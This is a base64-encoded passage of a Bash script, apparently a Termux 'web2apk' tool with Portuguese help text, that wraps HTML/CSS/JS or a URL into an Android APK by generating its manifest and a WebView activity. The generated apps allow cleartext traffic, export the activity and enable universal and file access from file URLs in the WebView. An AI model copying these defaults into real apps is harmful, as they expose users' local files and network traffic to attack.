N0cyBwaG9uZSBzbXMgd2FrZSBub3RpZmljYXRpb25zIGZsYXNobGlnaHQgc2Vuc29yc1wwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtdGVtcGxhdGU6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlICAgICAgICAgICAg4oCUIG1lbnUgaW50ZXJhdGl2byBkZSB0ZW1wbGF0ZXNcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgYmFzaWMgICAgICDigJQgZ2VyYSBiYXNpY2FwcC8gY29tIEhUTUwrQ1NTK0pTXDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlIGdhbWUgICAgICAg4oCUIGdlcmEgZ2FtZWFwcC8gY29tIGpvZ28gU25ha2VcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgcHdhICAgICAgICDigJQgZ2VyYSBwd2FhcHAvIGNvbSBQV0Egb2ZmbGluZVwwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtTWFudWFsIGRlIGFycXVpdm9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayAtLW1hbiAg4oCUIGV4cGxpY2EgbyBxdWUgY2FkYSBhcnF1aXZvIChIVE1ML0NTUy9KUykgZGV2ZSBjb250ZXJcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybUV4ZW1wbG9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayBidWlsZCAuL21ldWFwcC9cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLi9hcHAvIC0tbmFtZSBcIlZQTi1YXCIgLS1wa2duYW1lIGNvbS5teXZwbnggLS1wZXJtIGludGVybmV0LGNhbWVyYSAtLWZ1bGxzY3JlZW5cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLS11cmwgaHR0cHM6Ly9leGVtcGxvLmNvbSAtLW5hbWUgXCJNZXUgU2l0ZVwiXDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIGFwazJ3ZWIgTWV1QXBwLmFwa1wwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayBhcGsyd2ViIE1ldUFwcC5hcGsgLi9leHRyYWlkby9cMDMzWzBtXG5cbicKfQpfY21kX2J1aWxkKCkgewogIGxvY2FsIFNSQ19ESVI9JycgTE9BRF9VUkw9JycgQVBQX05BTUU9JycgUEtHX05BTUU9JycgSUNPTl9TUkM9JycKICBsb2NhbCBPVVRfQVBLPScnIFBFUk1TPScnIFZFUlNJT05fTkFNRT0nMS4wLjAnIFZFUlNJT05fQ09ERT0xCiAgbG9jYWwgTUlOX1NESz0yMSBUQVJHRVRfU0RLPTMzIE9SSUVOVEFUSU9OPSd1bnNwZWNpZmllZCcKICBsb2NhbCBGVUxMU0NSRUVOPTAgVEhFTUU9J2xpZ2h0JyBOT19JTlRFUk5FVD0wCgogIHdoaWxlIFsgJCMgLWd0IDAgXTsgZG8KICAgIGNhc2UgIiQxIiBpbgogICAgICAtLXVybCkgICAgICAgICAgTE9BRF9VUkw9IiQyIjsgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tbmFtZSkgICAgICAgICBBUFBfTkFNRT0iJDIiOyAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1wa2duYW1lKSAgICAgIFBLR19OQU1FPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLWljb24pICAgICAgICAgSUNPTl9TUkM9IiQyIjsgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tb3V0KSAgICAgICAgICBPVVRfQVBLPSIkMiI7ICAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1wZXJtfC0tcGVybXMpIFBFUk1TPSIkUEVSTVMsJDIiOyBzaGlmdCAyIDs7CiAgICAgIC0tdmVyc2lvbikgICAgICBWRVJTSU9OX05BTUU9IiQyIjsgIHNoaWZ0IDIgOzsKICAgICAgLS12ZXJzaW9uY29kZSkgIFZFUlNJT05fQ09ERT0iJDIiOyAgc2hpZnQgMiA7OwogICAgICAtLW1pbi1zZGspICAgICAgTUlOX1NESz0iJDIiOyAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tdGFyZ2V0LXNkaykgICBUQVJHRVRfU0RLPSIkMiI7ICAgIHNoaWZ0IDIgOzsKICAgICAgLS1vcmllbnRhdGlvbikgIE9SSUVOVEFUSU9OPSIkMiI7ICAgc2hpZnQgMiA7OwogICAgICAtLWZ1bGxzY3JlZW4pICAgRlVMTFNDUkVFTj0xOyAgICAgICBzaGlmdCA7OwogICAgICAtLXRoZW1lKSAgICAgICAgVEhFTUU9IiQyIjsgICAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tbm8taW50ZXJuZXQpICBOT19JTlRFUk5FVD0xOyAgICAgIHNoaWZ0IDs7CiAgICAgIC0tKikgICAgICAgICAgICBfd2FybiAiT3BjYW8gZGVzY29uaGVjaWRhOiAkMSI7IHNoaWZ0IDs7CiAgICAgICopIFsgLXogIiRTUkNfRElSIiBdICYmIFsgLXogIiRMT0FEX1VSTCIgXSAmJiBTUkNfRElSPSIkMSI7IHNoaWZ0IDs7CiAgICBlc2FjCiAgZG9uZQoKICBbIC1mICIkVzJBX0pBUiIgXSB8fCBfZXJyICdhbmRyb2lkLmphciBhdXNlbnRlLiBFeGVjdXRlOiB4cG0gaW5zdGFsbCB3ZWIyYXBrJwogIGlmIFsgLXogIiRMT0FEX1VSTCIgXTsgdGhlbgogICAgWyAteiAiJFNSQ19ESVIiIF0gJiYgeyBfY21kX2hlbHA7IGV4aXQgMTsgfQogICAgWyAtZCAiJFNSQ19ESVIiIF0gfHwgX2VyciAiRGlyZXRvcmlvIG5hbyBlbmNvbnRyYWRvOiAkU1JDX0RJUiIKICAgIFsgLWYgIiRTUkNfRElSL2luZGV4Lmh0bWwiIF0gfHwgX3dhcm4gJ2luZGV4Lmh0bWwgbmFvIGVuY29udHJhZG8nCiAgZmkKCiAgbG9jYWwgRElSX0JBU0U7IERJUl9CQVNFPSQoYmFzZW5hbWUgIiR7U1JDX0RJUiUvfSIpCiAgWyAteiAiJEFQUF9OQU1FIiBdICYmIEFQUF9OQU1FPSIke0RJUl9CQVNFOi1XZWJBcHB9IgogIGxvY2FsIFBLR19TQUZFOyBQS0dfU0FGRT0kKHByaW50ZiAnJXMnICIkQVBQX05BTUUiIHwgdHIgJ0EtWicgJ2EteicgfCBzZWQgJ3MvW15hLXowLTldL18vZztzL19fKi9fL2cnKQogIFsgLXogIiRQS0dfTkFNRSIgXSAmJiBQS0dfTkFNRT0iY29tLmVsbGlvdG9zLndlYmFway4ke1BLR19TQUZFfSIKICBbIC16ICIkT1VUX0FQSyIgIF0gJiYgT1VUX0FQSz0iJHtBUFBfTkFNRS8vIC9ffS5hcGsiCiAgWyAiJE5PX0lOVEVSTkVUIiAtZXEgMCBdICYmIFBFUk1TPSJpbnRlcm5ldCwkUEVSTVMiCgogIF9oZWFkICd3ZWIyYXBrIGJ1aWxkJwogIF9pbmZvICJBcHAgICAgIDogJEFQUF9OQU1FIgogIF9pbmZvICJQYWNrYWdlIDogJFBLR19OQU1FIgogIF9pbmZvICJTYWlkYSAgIDogJE9VVF9BUEsiCiAgWyAtbiAiJExPQURfVVJMIiBdICYmIF9pbmZvICJVUkwgICAgIDogJExPQURfVVJMIgogIFsgLW4gIiRTUkNfRElSIiAgXSAmJiBfaW5mbyAiRm9udGUgICA6ICRTUkNfRElSIgoKICBsb2NhbCBCVUlMRAogIEJVSUxEPSQobWt0ZW1wIC1kIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvdG1wL3dlYjJhcGsuWFhYWFhYIDI+L2Rldi9udWxsKSBcCiAgICB8fCBCVUlMRD0kKG1rdGVtcCAtZCAiJEhPTUUvLnhwbS93ZWIyYXBrL2J1aWxkLlhYWFhYWCIpCiAgdHJhcCAncm0gLXJmICIkQlVJTEQiJyBFWElUCgogIGxvY2FsIFBLR19QQVRIOyBQS0dfUEFUSD0kKHByaW50ZiAnJXMnICIkUEtHX05BTUUiIHwgdHIgJy4nICcvJykKICBta2RpciAtcCAiJEJVSUxEL3NyYy8kUEtHX1BBVEgiICIkQlVJTEQvY2xhc3NlcyIgIiRCVUlMRC9yZXNfY29tcGlsZWQiIFwKICAgICAgICAgICAiJEJVSUxEL3Jlcy92YWx1ZXMiICIkQlVJTEQvcmVzL3htbCIgIiRCVUlMRC9hc3NldHMvd3d3IiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUtbWRwaSIgICIkQlVJTEQvcmVzL2RyYXdhYmxlLWhkcGkiIFwKICAgICAgICAgICAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14aGRwaSIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHhoZHBpIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaSIKCiAgIyDilIDilIAgw41jb25lIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIF9pbmZvICdQcmVwYXJhbmRvIGljb25lLi4uJwogIGlmIFsgLW4gIiRJQ09OX1NSQyIgXSAmJiBbIC1mICIkSUNPTl9TUkMiIF07IHRoZW4KICAgIF9yZXNpemVfaWNvbiAiJElDT05fU1JDIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1tZHBpL2ljb24ucG5nIiAgICA0OAogICAgX3Jlc2l6ZV9pY29uICIkSUNPTl9TUkMiICIkQlVJTEQvcmVzL2RyYXdhYmxlLWhkcGkvaWNvbi5wbmciICAgIDcyCiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkvaWNvbi5wbmciICAgOTYKICAgIF9yZXNpemVfaWNvbiAiJElDT05fU1JDIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eGhkcGkvaWNvbi5wbmciICAxNDQKICAgIF9yZXNpemVfaWNvbiAiJElDT05fU1JDIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eHhoZHBpL2ljb24ucG5nIiAxOTIKICBlbHNlCiAgICBbIC1uICIkSUNPTl9TUkMiIF0gJiYgX3dhcm4gIkljb25lIG5hbyBlbmNvbnRyYWRvOiAkSUNPTl9TUkMgLS0gdXNhbmRvIGdlcmFkbyIKICAgIF9nZW5faWNvbiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1tZHBpL2ljb24ucG5nIiAgICA0OAogICAgX2dlbl9pY29uICIkQlVJTEQvcmVzL2RyYXdhYmxlLWhkcGkvaWNvbi5wbmciICAgIDcyCiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkvaWNvbi5wbmciICAgOTYKICAgIF9nZW5faWNvbiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eGhkcGkvaWNvbi5wbmciICAxNDQKICAgIF9nZW5faWNvbiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS14eHhoZHBpL2ljb24ucG5nIiAxOTIKICBmaQoKICAjIOKUgOKUgCBBc3NldHMgKHN1cG9ydGEgbXVsdGlwbG9zIEhUTUwvQ1NTL0pTIGUgc3VicGFzdGFzKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBbIC1uICIkU1JDX0RJUiIgXSAmJiBbIC1kICIkU1JDX0RJUiIgXSAmJiB7CiAgICBjcCAtciAiJFNSQ19ESVIiLy4gIiRCVUlMRC9hc3NldHMvd3d3LyIKICAgIGxvY2FsIF9uX3RvdGFsIF9uX2h0bWwgX25fY3NzIF9uX2pzCiAgICBfbl90b3RhbD0kKGZpbmQgIiRCVUlMRC9hc3NldHMvd3d3IiAtdHlwZSBmIHwgd2MgLWwpCiAgICBfbl9odG1sPSQoZmluZCAgIiRCVUlMRC9hc3NldHMvd3d3IiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHdjIC1sKQogICAgX25fY3NzPSQoZmluZCAgICIkQlVJTEQvYXNzZXRzL3d3dyIgLXR5cGUgZiAtaW5hbWUgIiouY3NzIiAgfCB3YyAtbCkKICAgIF9uX2pzPSQoZmluZCAgICAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmpzIiAgIHwgd2MgLWwpCiAgICBfaW5mbyAiQXNzZXRzIGNvcGlhZG9zOiAkX25fdG90YWwgYXJxdWl2b3MgKCRfbl9odG1sIEhUTUwsICRfbl9jc3MgQ1NTLCAkX25fanMgSlMpIgogICAgIyBMaXN0YXIgSFRNTHMgZW5jb250cmFkb3MgKHBvZGVtIHNlciB2YXJpb3MpCiAgICBpZiBbICIkX25faHRtbCIgLWd0IDEgXTsgdGhlbgogICAgICBfaW5mbyAiUGFnaW5hcyBIVE1MIGVuY29udHJhZGFzOiIKICAgICAgZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmh0bWwiIHwgc2VkICJzfCRCVUlMRC9hc3NldHMvd3d3L3x8IiB8IHdoaWxlIHJlYWQgLXIgX2Y7IGRvCiAgICAgICAgX2RpbSAiICAkX2YiCiAgICAgIGRvbmUKICAgIGZpCiAgICAjIEVudHJhZGEgcHJpbmNpcGFsIG9icmlnYXRvcmlhCiAgICBpZiBbICEgLWYgIiRCVUlMRC9hc3NldHMvd3d3L2luZGV4Lmh0bWwiIF07IHRoZW4KICAgICAgIyBWZXJpZmljYXIgc2UgZXhpc3RlIGFsZ3VtIEhUTUwgcGFyYSBzdWdlcmlyCiAgICAgIGxvY2FsIF9maXJzdF9odG1sCiAgICAgIF9maXJzdF9odG1sPSQoZmluZCAiJEJVSUxEL2Fzc2V0cy93d3ciIC10eXBlIGYgLWluYW1lICIqLmh0bWwiIHwgaGVhZCAtMSkKICAgICAgaWYgWyAtbiAiJF9maXJzdF9odG1sIiBdOyB0aGVuCiAgICAgICAgX3dhcm4gImluZGV4Lmh0bWwgbmFvIGVuY29udHJhZG8g4oCUIHBvbnRvIGRlIGVudHJhZGEgc2VyYTogJChiYXNlbmFtZSAiJF9maXJzdF9odG1sIikiCiAgICAgICAgSkFWQV9MT0FEX0ZBTExCQUNLPSJmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3LyQoYmFzZW5hbWUgIiRfZmlyc3RfaHRtbCIpIgogICAgICBlbHNlCiAgICAgICAgX3dhcm4gJ05lbmh1bSBhcnF1aXZvIC5odG1sIGVuY29udHJhZG8gbm8gZGlyZXRvcmlvJwogICAgICAgIEpBVkFfTE9BRF9GQUxMQkFDSz0nZmlsZTovLy9hbmRyb2lkX2Fzc2V0L3d3dy9pbmRleC5odG1sJwogICAgICBmaQogICAgZmkKICB9CgogICMg4pSA4pSAIHN0cmluZ3MueG1sIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGV4cG9ydCBXMkFfQVBQPSIkQVBQX05BTUUiIFcyQV9CVUlMRD0iJEJVSUxEIgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3lzLCBvcwphcHAgPSBvcy5lbnZpcm9uLmdldCgnVzJBX0FQUCcsJ0FwcCcpCm91dCA9IG9zLmVudmlyb24uZ2V0KCdXMkFfQlVJTEQnLCcnKSArICcvcmVzL3ZhbHVlcy9zdHJpbmdzLnhtbCcKIyBFc2NhcGFyIGNhcmFjdGVyZXMgZXNwZWNpYWlzIFhNTAphcHAgPSBhcHAucmVwbGFjZSgnJicsJyZhbXA7JykucmVwbGFjZSgnPCcsJyZsdDsnKS5yZXBsYWNlKCc+JywnJmd0OycpLnJlcGxhY2UoJ1wiJywnJnF1b3Q7JykKb3BlbihvdXQsJ3cnKS53cml0ZSgnPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwidXRmLThcIj8+XG48cmVzb3VyY2VzPlxuICAgIDxzdHJpbmcgbmFtZT1cImFwcF9uYW1lXCI+JyArIGFwcCArICc8L3N0cmluZz5cbjwvcmVzb3VyY2VzPlxuJykKIgoKICAjIOKUgOKUgCBuZXR3b3JrX3NlY3VyaXR5X2NvbmZpZy54bWwg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgY2F0ID4gIiRCVUlMRC9yZXMveG1sL25ldHdvcmtfc2VjdXJpdHlfY29uZmlnLnhtbCIgPDwgJ05TRU9GJwo8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pgo8bmV0d29yay1zZWN1cml0eS1jb25maWc+CiAgICA8YmFzZS1jb25maWcgY2xlYXJ0ZXh0VHJhZmZpY1Blcm1pdHRlZD0idHJ1ZSI+CiAgICAgICAgPHRydXN0LWFuY2hvcnM+PGNlcnRpZmljYXRlcyBzcmM9InN5c3RlbSIvPjwvdHJ1c3QtYW5jaG9ycz4KICAgIDwvYmFzZS1jb25maWc+CjwvbmV0d29yay1zZWN1cml0eS1jb25maWc+Ck5TRU9GCgogICMg4pSA4pSAIFBlcm1pc3PDtWVzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGxvY2FsIFBFUk1TX0xJU1QKICBQRVJNU19MSVNUPSQocHJpbnRmICclcycgIiRQRVJNUyIgfCB0ciAnLCcgJ1xuJyB8IHdoaWxlIHJlYWQgLXIgcDsgZG8gX3Blcm1fcmVzb2x2ZSAiJHAiOyBkb25lIHwgc29ydCAtdSB8IHRyICdcbicgJ3wnKQoKICAjIOKUgOKUgCBBbmRyb2lkTWFuaWZlc3QueG1sIHZpYSBQeXRob24g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgbG9jYWwgT1JJRU5UX0FORFJPSUQ9J3Vuc3BlY2lmaWVkJwogIGNhc2UgIiRPUklFTlRBVElPTiIgaW4KICAgIHBvcnRyYWl0KSAgT1JJRU5UX0FORFJPSUQ9J3BvcnRyYWl0JyA7OwogICAgbGFuZHNjYXBlKSBPUklFTlRfQU5EUk9JRD0nbGFuZHNjYXBlJyA7OwogICAgYXV0bykgICAgICBPUklFTlRfQU5EUk9JRD0nZnVsbFNlbnNvcicgOzsKICBlc2FjCgogIGV4cG9ydCBXMkFfUEtHPSIkUEtHX05BTUUiIFcyQV9WQz0iJFZFUlNJT05fQ09ERSIgVzJBX1ZOPSIkVkVSU0lPTl9OQU1FIiBcCiAgICAgICAgIFcyQV9NSU5TREs9IiRNSU5fU0RLIiBXMkFfVEdUU0RLPSIkVEFSR0VUX1NESyIgXAogICAgICAgICBXMkFfT1JJRU5UPSIkT1JJRU5UX0FORFJPSUQiIFcyQV9QRVJNUz0iJFBFUk1TX0xJU1QiCgogIHB5dGhvbjMgLWMgIgppbXBvcnQgb3MKYnVpbGQgID0gb3MuZW52aXJvblsnVzJBX0JVSUxEJ10KcGtnICAgID0gb3MuZW52aXJvblsnVzJBX1BLRyddCnZjICAgICA9IG9zLmVudmlyb25bJ1cyQV9WQyddCnZuICAgICA9IG9zLmVudmlyb25bJ1cyQV9WTiddCm1pbnNkayA9IG9zLmVudmlyb25bJ1cyQV9NSU5TREsnXQp0Z3RzZGsgPSBvcy5lbnZpcm9uWydXMkFfVEdUU0RLJ10Kb3JpZW50ID0gb3MuZW52aXJvblsnVzJBX09SSUVOVCddCnBlcm1zICA9IFtwIGZvciBwIGluIG9zLmVudmlyb25bJ1cyQV9QRVJNUyddLnNwbGl0KCd8JykgaWYgcF0KcHhtbCAgID0gJycuam9pbignICAgIDx1c2VzLXBlcm1pc3Npb24gYW5kcm9pZDpuYW1lPVwiJyArIHAgKyAnXCIvPlxuJyBmb3IgcCBpbiBwZXJtcykKeG1sICAgID0gKCc8P3htbCB2ZXJzaW9uPVwiMS4wXCIgZW5jb2Rpbmc9XCJ1dGYtOFwiPz5cbicKICAgICAgICAgICc8bWFuaWZlc3QgeG1sbnM6YW5kcm9pZD1cImh0dHA6Ly9zY2hlbWFzLmFuZHJvaWQuY29tL2Fway9yZXMvYW5kcm9pZFwiXG4nCiAgICAgICAgICAnICAgIHBhY2thZ2U9XCInICsgcGtnICsgJ1wiXG4nCiAgICAgICAgICAnICAgIGFuZHJvaWQ6dmVyc2lvbkNvZGU9XCInICsgdmMgKyAnXCJcbicKICAgICAgICAgICcgICAgYW5kcm9pZDp2ZXJzaW9uTmFtZT1cIicgKyB2biArICdcIj5cbicKICAgICAgICAgICcgICAgPHVzZXMtc2RrIGFuZHJvaWQ6bWluU2RrVmVyc2lvbj1cIicgKyBtaW5zZGsgKyAnXCIgYW5kcm9pZDp0YXJnZXRTZGtWZXJzaW9uPVwiJyArIHRndHNkayArICdcIi8+XG4nCiAgICAgICAgICArIHB4bWwgKwogICAgICAgICAgJyAgICA8YXBwbGljYXRpb24gYW5kcm9pZDpsYWJlbD1cIkBzdHJpbmcvYXBwX25hbWVcIiBhbmRyb2lkOmljb249XCJAZHJhd2FibGUvaWNvblwiXG4nCiAgICAgICAgICAnICAgICAgICBhbmRyb2lkOmhhcmR3YXJlQWNjZWxlcmF0ZWQ9XCJ0cnVlXCIgYW5kcm9pZDp1c2VzQ2xlYXJ0ZXh0VHJhZmZpYz1cInRydWVcIlxuJwogICAgICAgICAgJyAgICAgICAgYW5kcm9pZDpuZXR3b3JrU2VjdXJpdHlDb25maWc9XCJAeG1sL25ldHdvcmtfc2VjdXJpdHlfY29uZmlnXCI+XG4nCiAgICAgICAgICAnICAgICAgICA8YWN0aXZpdHkgYW5kcm9pZDpuYW1lPVwiLldlYkFjdGl2aXR5XCIgYW5kcm9pZDpleHBvcnRlZD1cInRydWVcIlxuJwogICAgICAgICAgJyAgICAgICAgICAgIGFuZHJvaWQ6c2NyZWVuT3JpZW50YXRpb249XCInICsgb3JpZW50ICsgJ1wiXG4nCiAgICAgICAgICAnICAgICAgICAgICAgYW5kcm9pZDpjb25maWdDaGFuZ2VzPVwib3JpZW50YXRpb258c2NyZWVuU2l6ZXxrZXlib2FyZEhpZGRlblwiPlxuJwogICAgICAgICAgJyAgICAgICAgICAgIDxpbnRlbnQtZmlsdGVyPlxuJwogICAgICAgICAgJyAgICAgICAgICAgICAgICA8YWN0aW9uIGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmFjdGlvbi5NQUlOXCIvPlxuJwogICAgICAgICAgJyAgICAgICAgICAgICAgICA8Y2F0ZWdvcnkgYW5kcm9pZDpuYW1lPVwiYW5kcm9pZC5pbnRlbnQuY2F0ZWdvcnkuTEFVTkNIRVJcIi8+XG4nCiAgICAgICAgICAnICAgICAgICAgICAgPC9pbnRlbnQtZmlsdGVyPlxuJwogICAgICAgICAgJyAgICAgICAgPC9hY3Rpdml0eT5cbicKICAgICAgICAgICcgICAgPC9hcHBsaWNhdGlvbj5cbicKICAgICAgICAgICc8L21hbmlmZXN0PlxuJykKb3BlbihidWlsZCArICcvQW5kcm9pZE1hbmlmZXN0LnhtbCcsICd3Jykud3JpdGUoeG1sKQpwcmludCgnICBNYW5pZmVzdDogJyArIGJ1aWxkICsgJy9BbmRyb2lkTWFuaWZlc3QueG1sJykKIgoKICAjIOKUgOKUgCBXZWJBY3Rpdml0eS5qYXZhIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGxvY2FsIEpBVkFfRlMgSkFWQV9USEVNRSBKQVZBX0xPQUQKICBbICIkRlVMTFNDUkVFTiIgLWVxIDEgXSBcCiAgICAmJiBKQVZBX0ZTPScgICAgICAgIHJlcXVlc3RXaW5kb3dGZWF0dXJlKGFuZHJvaWQudmlldy5XaW5kb3cuRkVBVFVSRV9OT19USVRMRSk7IGdldFdpbmRvdygpLnNldEZsYWdzKGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4sIGFuZHJvaWQudmlldy5XaW5kb3dNYW5hZ2VyLkxheW91dFBhcmFtcy5GTEFHX0ZVTExTQ1JFRU4pOycgXAogICAgfHwgSkFWQV9GUz0nICAgICAgICAvLyBzdGF0dXMgYmFyIG5vcm1hbCcKICBjYXNlICIkVEhFTUUiIGluCiAgICBkYXJrKSAgICAgICAgSkFWQV9USEVNRT0nICAgICAgICB3LnNldEJhY2tncm91bmRDb2xvcigweEZGMDAwMDAwKTsnIDs7CiAgICB0cmFuc3BhcmVudCkgSkFWQV9USEVNRT0nICAgICAgICB3LnNldEJhY2tncm91bmRDb2xvcigweDAwMDAwMDAwKTsnIDs7CiAgICAqKSAgICAgICAgICAgSkFWQV9USEVNRT0nICAgICAgICAvLyBmdW5kbyBwYWRyYW8nIDs7CiAgZXNhYwogIGlmIFsgLW4gIiRMT0FEX1VSTCIgXTsgdGhlbgogICAgSkFWQV9MT0FEPSIkTE9BRF9VUkwiCiAgZWxpZiBbIC1uICIke0pBVkFfTE9BRF9GQUxMQkFDSzotfSIgXTsgdGhlbgogICAgSkFWQV9MT0FEPSIkSkFWQV9MT0FEX0ZBTExCQUNLIgogIGVsc2UKICAgIEpBVkFfTE9BRD0nZmlsZTovLy9hbmRyb2lkX2Fzc2V0L3d3dy9pbmRleC5odG1sJwogIGZpCgogIGNhdCA+ICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiA8PCBKQVZBRU9GCnBhY2thZ2UgJFBLR19OQU1FOwppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lkLm9zLkJ1bmRsZTsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlNldHRpbmdzOwppbXBvcnQgYW5kcm9pZC53ZWJraXQuV2ViVmlldzsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlZpZXdDbGllbnQ7CnB1YmxpYyBjbGFzcyBXZWJBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsKICAgIHByaXZhdGUgV2ViVmlldyB3OwogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lkIG9uQ3JlYXRlKEJ1bmRsZSBiKSB7CiAgICAgICAgc3VwZXIub25DcmVhdGUoYik7CiRKQVZBX0ZTCiAgICAgICAgdyA9IG5ldyBXZWJWaWV3KHRoaXMpOwokSkFWQV9USEVNRQogICAgICAgIHNldENvbnRlbnRWaWV3KHcpOwogICAgICAgIFdlYlNldHRpbmdzIHMgPSB3LmdldFNldHRpbmdzKCk7CiAgICAgICAgcy5zZXRKYXZhU2NyaXB0RW5hYmxlZCh0cnVlKTsgcy5zZXREb21TdG9yYWdlRW5hYmxlZCh0cnVlKTsKICAgICAgICBzLnNldEFsbG93RmlsZUFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsgcy5zZXRBbGxvd1VuaXZlcnNhbEFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsKICAgICAgICBzLnNldEJ1aWx0SW5ab29tQ29udHJvbHMoZmFsc2UpOyBzLnNldERpc3BsYXlab29tQ29udHJvbHMoZmFsc2UpOwogICAgICAgIHMuc2V0VXNlV2lkZVZpZXdQb3J0KHRydWUpOyBzLnNldE